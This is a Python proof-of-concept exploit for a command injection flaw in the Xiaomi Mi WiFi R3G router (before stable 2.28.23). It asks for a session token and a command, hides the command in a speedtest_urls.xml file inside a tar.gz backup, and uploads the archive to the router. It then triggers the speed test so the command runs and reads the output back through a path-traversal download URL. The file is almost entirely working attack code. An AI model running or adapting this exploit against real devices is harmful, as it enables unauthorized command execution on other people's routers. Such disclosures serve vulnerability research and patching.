#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23. 
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress, 
# so you can control the contents of the files in the decompressed directory. 
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml, 
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security

import os
import tarfile
import requests

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

## get stok
stok = input("stok: ")

## make config file
command = input("command: ")
speed_test_filename = "speedtest_urls.xml"
with open("template.xml","rt") as f:
	template = f.read()
data = template.format(command=command)
# print(data)
with open("speedtest_urls.xml",'wt') as f:
	f.write(data)

with tarfile.open("payload.tar.gz", "w:gz") as tar:
	# tar.add("cfg_backup.des")
	# tar.add("cfg_backup.mbu")
	tar.add("speedtest_urls.xml")

## upload config file
print("start uploading config file ...")
r1 = requests.post("http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(stok), files={"image":open("payload.tar.gz",'rb')}, proxies=proxies)
# print(r1.text)

## exec download speed test, exec command
print("start exec command...")
r2 = requests.get("http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(stok), proxies=proxies)
# print(r2.text)

## read result file
r3 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt", proxies=proxies)
if r3.status_code == 200:
	print("success, vul")
	print(r3.text)
